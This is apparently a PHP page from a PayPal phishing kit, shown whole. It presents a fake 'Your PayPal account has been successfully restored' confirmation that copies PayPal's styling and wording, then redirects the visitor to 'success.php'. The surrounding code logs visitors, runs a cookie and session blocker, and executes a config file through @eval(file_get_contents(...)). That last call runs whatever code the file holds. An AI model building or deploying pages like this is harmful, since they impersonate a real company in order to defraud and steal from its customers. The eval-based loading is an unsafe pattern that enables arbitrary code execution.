<?php include'proxy.php';?>
<?php
require_once __DIR__ . '/function.php';

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

if ($config_blocker == 1) {
  $api->cookie();
  $api->session();
}

$api->visitor("Restored");

$page = 'restored';
$notification = 0;
require __DIR__ . '/page/header.php';
?>
<head>
<title><?=$fo8;?></title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<script src="assets/js/jquery.min.js"></script>
<link rel="stylesheet" href="assets/css/app.css">
</head>
<div class="contents vx_mainContent">
<div class="mainContents summaryContainer">
<div class="engagementModule nemo_engagementModule">
<div class="engagementMainBar-container js_engagementMainBar-container">
<div class="summarySection engagementMainBar row" style="height:0%;">
<div class="col-sm-7 progressAndWelcome">
<div class="welcomeMessage js_selectModule selectModule profileStatus active">
<p class="vx_h3 engagementWelcomeMessage nemo_welcomeMessageHeader">
<span class="icon icon-small icon-shield" style="color:#ffffff"></span>&nbsp;<span style="color:#FFFFFF"><?=$api->transcode("Successfully Restored"); ?></span>
</p>
</div>
</div>
</div>
</div>
</div>
<div class="mainBody">
<div class="summarySection">
<div class="row">
<div class="col-sm-12 summaryModuleContainer">
<section class="walletModule nemo_balanceModule">
<div class="balanceModule">
<div class="footerLink">
<img src="assets/img/success.png" width="90px" height="87px">
<center><p style="padding-top:8px;font-size:16px"><b><?=$api->transcode("Your PayPal account has been successfully restored.");?></b></p></center>
<hr>
<script>
document.title = 'Successfully Restored'
function geoplugin_continentCode() { return 'DI';} 
</script>
<p style="text-align:left;font-size:14px;">
<?=$api->transcode("You have completed all the checklist items, you must log in again to see the changes to your account."); ?>
</p>
<p style="text-align:left;font-size:14px"><b><?=$api->transcode("PayPal takes the safety of your account, business and financial data as seriously as you do, and these ongoing checks of our system contribute to our high level of security."); ?></b>
</p>
<hr>
<p style="padding-top:8px;text-align:left;font-size:16px"><b><?=$api->transcode("REDIRECTING"); ?></b></p>
<ul style="padding-left: 40px;">
<li style="padding-bottom:8px;text-align:left;font-size:14px">
<?=$api->transcode("You will be redirected automatically to login page in a few seconds.");?>
</li>
</ul>
<p>
<img src="assets/img/load.gif">
</p>
</div>
</div>
</section>
</div>
</div>
</div>
</div>
</div>
</div>
<script>setTimeout("location.href = 'success.php?=<?=$num5;?>'", 6000);</script>
<?php
require __DIR__ . '/page/footer.php';
?>
